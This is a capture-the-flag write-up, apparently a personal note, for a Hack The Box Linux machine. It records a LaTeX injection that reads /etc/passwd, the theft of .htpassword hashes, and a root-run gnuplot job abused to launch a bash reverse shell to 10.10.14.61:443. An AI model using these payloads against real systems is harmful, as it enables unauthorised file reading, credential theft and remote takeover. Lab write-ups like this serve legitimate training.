--- tag: hackthebox-easy, linux ---

![[Pasted image 20230614090600.png]]

on running rustscan we can see that the port 22 and 80 are open, a web page is hosted on port 80 
![[Pasted image 20230614091028.png]]

Since the webpage is hosted in http://latex.topology.htb/equation.php  the route / http://latex.topology.htb/ should be protected which is not done here
so we are able to view all the files in the root directory

![[Pasted image 20230614091612.png]]

since the site is made with PHP which implements latex , we can see a header.tex

```
% vdaisley's default latex header for beautiful documents
\usepackage[utf8]{inputenc} % set input encoding
\usepackage{graphicx} % for graphic files
\usepackage{eurosym} % euro currency symbol
\usepackage{times} % set nice font, tex default font is not my style
\usepackage{listings} % include source code files or print inline code
\usepackage{hyperref} % for clickable links in pdfs
\usepackage{mathtools,amssymb,amsthm} % more default math packages
\usepackage{mathptmx} % math mode with times font
```


we tried various ways but we are not able to read the whole content of /etc/passwd file 

since the listing module is imported we can simply use the following code to read /etc/passwd

````latex
$\lstinputlisting[caption=/etc/passwd, label=lst:passwd]{/etc/passwd}$
````

so we get the list of usernames
```
Listing 1: /etc/passwd
root:x:0:0:root:/root:/ bin/bash
daemon:x:1:1:daemon:/usr/sbin :/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync :x:4:65534:sync:/bin:/bin/sync

games :Xx:5:60: games :/ usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

Ip:x:7:7:1p :/var/spool/lpd:/usr/sbin/nologin

mail :x:8:8: mail :/ var/ mail :/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy :x:13:13:proxy:/bin:/usr/sbin/nologin

www—data :x:33:33:www—data :/var/www:/usr/sbin/nologin

backup:x:34:34: backup :/var/backups:/usr/sbin/nologin

list :x:38:38: Mailing List Manager:/var/ list :/usr/sbin/nologin

irc:x:39:39:ircd :/var/run/ircd :/usr/sbin/nologin

gnats :x:41:41:Gnats Bug—Reporting System (admin ):/var/lib/gnats:/usr/sbin/nologin
nobody :x:65534:65534: nobody :/ nonexistent :/usr/sbin/nologin
systemd—network:x:100:102:systemd Network Management, , ,:/run/systemd:/usr/sbin/nologin
systemd—resolve :x:101:103:systemd Resolver ,,,:/run/systemd:/usr/sbin/nologin
systemd—timesync :x:102:104:systemd Time Synchronization ,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/ nonexistent :/usr/sbin/nologin
syslog:x:104:110::/home/syslog :/usr/sbin/nologin
_apt:x:105:65534::/ nonexistent :/usr/sbin/nologin
mysql:x:106:112:MySQL Server ,, ,:/ nonexistent :/bin/ false
tss:x:107:113: TPM software stack ,,,:/var/lib/tpm:/bin/ false
uuidd:x:108:115::/run/uuidd :/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate :x:112:1::/var/cache/ pollinate :/bin/ false
systemd—coredump :x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
vdaisley :x:1007:1007: Vajramani Daisley ,W2 1 —123,,:/home/vdaisley :/ bin/bash
rtkit:x:113:121:RealtimeKit,, ,:/proc:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,, ,:/var/lib/misc:/usr/sbin/nologin
cups—pk—helper:x:115:119: user for cups—pk—helper service ,,,:/home/cups—pk—helper:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon, ,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:117:124: Avahi mDNS daemon, , ,:/var/run/avahi—daemon:/usr/sbin/nologin
geoclue:x:118:125::/var/lib/geoclue :/usr/sbin/nologin
saned:x:119:127::/var/1lib/saned:/usr/sbin/nologin

colord:x:120:128:colord colour management daemon, ,,:/var/lib/colord:/usr/sbin/nologin
pulse :x:121:129: PulseAudio daemon, ,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:122:131:Gnome Display Manager:/var/lib/gdm3:/bin/ false
fwupd—refresh:x:109:116:fwupd—refresh user ,,,:/run/systemd:/usr/sbin/nologin
_laurel :x:998:998::/var/log/laurel :/bin/ false
```



---
### Loot
000-default.conf

![[Pasted image 20230615082744.png]]

---
On visiting the dev.topology.htb  site which is an authenticated route so we require password 
since we have access to read local files on the system we are able to retrieve the password hashes from .htpassword in /var/www/dev/.htpassword

![[WhatsApp Image 2023-06-15 at 9.12.55 AM.jpeg]]

![[WhatsApp Image 2023-06-15 at 9.13.09 AM.jpeg]]

![[WhatsApp Image 2023-06-15 at 9.13.19 AM.jpeg]]

we got the password for vdaisley

on ssh into the machine and running pspy we can see there is a process executing all the plt files in the /opt/gnuplot directory

![[Pasted image 20230615194618.png]]

so we write a file with the following content in /dev/shm 

```exploit
sh -i >& /dev/tcp/10.10.14.61/443 0>&1
```


and we can execute system command in gnuplot using system command

```
system "bash /dev/shm/exploit"
```


we got root access
